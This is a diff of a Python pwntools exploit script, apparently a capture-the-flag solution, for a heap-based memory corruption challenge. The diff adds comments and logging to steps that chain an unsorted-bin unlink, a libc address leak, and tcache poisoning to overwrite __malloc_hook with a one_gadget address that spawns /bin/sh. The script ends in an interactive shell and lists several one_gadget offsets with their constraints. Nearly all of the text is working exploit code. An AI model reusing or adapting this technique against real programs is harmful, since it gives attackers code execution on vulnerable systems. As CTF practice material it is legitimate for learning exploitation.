@@ -33,6 +33,7 @@ delete(1)
 delete(4)#ub
 delete(2)#ub 0x500
 delete(0)#ub
+#0x300 0x500 0x700 -> unsorted bin -> generate valid fd & bk
 for i in range(10):
     alloc(8,'\x00')
 sleep(0.1)
@@ -44,7 +45,7 @@ delete(9)#tc
 delete(8)#tc
 delete(7)#tc
 delete(1)
-
+#0x600 -> unsorted bin -> allow valid combinition
 alloc(8,'\x00')
 alloc(248,'\x00')
 for i in range(5):
@@ -60,12 +61,14 @@ delete(8)
 delete(2)
 
 delete(9)#0x600
+log.success('UNLINK DONE')
 
 puts(1)
 leak0 = u64(r.recv(6).ljust(8,'\x00'))
-libase = leak0 - lib.symbols['main_arena'] - 96#0x3b0c80
+libase = leak0 - lib.symbols['main_arena'] - 96 #0x3b0c80
 log.info('LIBC BASE -> '+str(hex(libase)))
-# 1 & 9
+# 1 & 9 both point to 0x500
+
 for i in range(8):
     alloc(8,str(i)*8)
 delete(2)
@@ -80,10 +83,13 @@ delete(1)
 delete(2)
 alloc(8,p64(libase+lib.symbols['__malloc_hook']))
 alloc(8,'AAAA')
-alloc(8,p64(libase+0x4f2c5))
+alloc(8,p64(libase+0x10a38c))
+log.success('TCACHE POISONING DONE')
+r.sendlineafter('command?\n> ','1')
 r.interactive()
 
-'''0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
+'''
+0x4f2c5	execve("/bin/sh", rsp+0x40, environ)
 constraints:
   rcx == NULL
 
@@ -94,5 +100,4 @@ constraints:
 0x10a38c	execve("/bin/sh", rsp+0x70, environ)
 constraints:
   [rsp+0x70] == NULL
-
 '''
